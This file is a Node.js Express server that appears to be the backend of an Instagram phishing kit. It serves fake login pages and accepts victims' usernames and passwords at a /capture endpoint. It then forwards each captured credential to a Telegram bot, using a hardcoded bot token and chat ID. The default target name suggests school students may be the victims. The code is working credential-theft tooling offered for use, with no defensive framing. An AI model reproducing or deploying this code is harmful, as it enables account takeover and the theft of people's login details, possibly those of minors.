const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// YOUR TELEGRAM DETAILS (already filled)
const TELEGRAM_TOKEN = "8696476669:AAGMMBP7BKj3f_D4KwMU4xbVMEj4q_hZqr4";
const CHAT_ID = "8725339154";

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));   // serves index.html and 1.html

app.post('/capture', async (req, res) => {
    const { username, password, target, time } = req.body || {};

    if (!username || !password) {
        return res.json({ success: true });
    }

    console.log(`[CAPTURED] Username: ${username}`);

    // Clean and nicely formatted message
    const message = `
*Instagram Login Captured* 🔥

*Username / Email:* ${username}
*Password:* ||${password}||
*Target:* ${target || "smrj.class9.confessions"}
*Time:* ${time ? new Date(time).toLocaleString() : new Date().toLocaleString()}
    `.trim();

    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "MarkdownV2"
            })
        });

        if (response.ok) {
            console.log("✅ Successfully sent to Telegram");
        } else {
            console.error(`❌ Telegram Error: ${response.status}`);
        }
    } catch (err) {
        console.error("❌ Failed to send to Telegram:", err.message);
    }

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log("✅ Telegram bot is ready. Test a login now!");
});
